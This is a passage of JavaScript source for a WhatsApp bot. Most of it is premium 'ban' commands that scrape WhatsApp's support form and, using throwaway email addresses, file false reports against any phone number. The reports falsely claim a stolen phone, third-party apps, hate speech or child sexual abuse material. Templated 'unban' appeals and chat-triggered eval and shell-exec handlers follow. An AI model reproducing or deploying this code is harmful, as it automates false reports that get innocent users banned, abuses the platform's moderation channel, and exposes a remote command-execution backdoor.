let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'ban4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'ban5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'ban6': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unban1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unban2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unban3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unban4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unban5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'meng':{
                	let audiobuffy = fs.readFileSync('./KenvFile/oke.mp4')
Kev.sendMessage(m.chat, { video: audiobuffy })     
}
break

            default:
                if (budy.startsWith('=>')) {
                    if (!KevTheCreator) return KevStickOwner()
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygckev(bang)
                    }
                    try {
                        replygckev(util.format(eval('(async () => { return ${budy.slice(3)} })()')))
                    } catch (e) {
                        replygckev(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!KevTheCreator) return KevStickOwner()
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygckev(evaled)
                    } catch (err) {
                        await replygckev(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!KevTheCreator) return KevStickOwner()
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygckev(err)
                        if (stdout) return replygckev(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
Kev.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
            }
    } catch (err) {
        console.log(util.format(err))
        let e = String(err)
Kev.sendMessage("237656774511@s.whatsapp.net", { text: "Hey boss il se peut que nous rencontrons une erreur, Veuillez s.il vous plait la reparer " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
if (e.includes("conflict")) return
if (e.includes("Cannot derive from empty media key")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
